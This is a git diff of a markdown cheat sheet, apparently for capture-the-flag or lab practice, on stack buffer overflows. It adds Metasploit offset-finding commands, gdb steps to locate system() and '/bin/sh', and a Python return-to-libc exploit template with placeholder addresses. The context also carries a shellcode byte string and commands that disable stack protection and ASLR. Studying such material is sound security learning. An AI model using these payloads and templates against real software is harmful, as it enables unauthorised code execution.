@@ -1,6 +1,7 @@
 # Buffer overflow
 
 </br>
+
 ## Tools
 
 * Plugin pour gdb : https://github.com/longld/peda
@@ -10,19 +11,21 @@
 * strace
 * pmap `pidof xxx`
 * PwnTools 
+* /usr/share/metasploit-framework/tools/exploit/pattern create.rb -l 2000
+* /usr/share/metasploit-framework/tools/exploit/pattern offset.rb -q 0x41424344
 
 </br>
 
-## Payloads
+### Payloads
 
-### dash
+#### dash
 ````
 "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 ````
 
 </br>
 
-## Disable securities
+### Disable securities
 
 gcc -fno-stack-protector -z execstack 
 Disable ASLR for one binary : setarch `uname -m` -R /root/mybinary
@@ -34,6 +37,18 @@ Disable ASLR:
 sysctl -w kernel.randomize_va_space=0 in /etc/sysctl.conf
 
 gcc -m32
+
+</br>
+
+### gdb
+
+#### Find system address
+
+* source /usr/share/gdb-peda/peda.py
+* r
+* print system
+* find "/bin/sh" all
+
 
 </br>
 
@@ -146,6 +161,24 @@ On se le refait mais avec la payload après EIP
 
 ## Stack/Heap non executable -> return to LibC
 
+```
+#!/usr/bin/python
+import os
+import struct
+
+libc_system = struct.pack('<I', 0xaeaeaeae)
+libc_binsh  = struct.pack('<I', 0xaeaeaeae)
+
+buffer  = 'A'*64
+buffer += libc_system
+buffer += 'AAAA'
+buffer += libc_binsh
+
+progname ="./buffer_01"
+os.environ['VAR']=buffer
+os.execve(progname, [progname], os.environ)
+
+````
 
 </br>
 
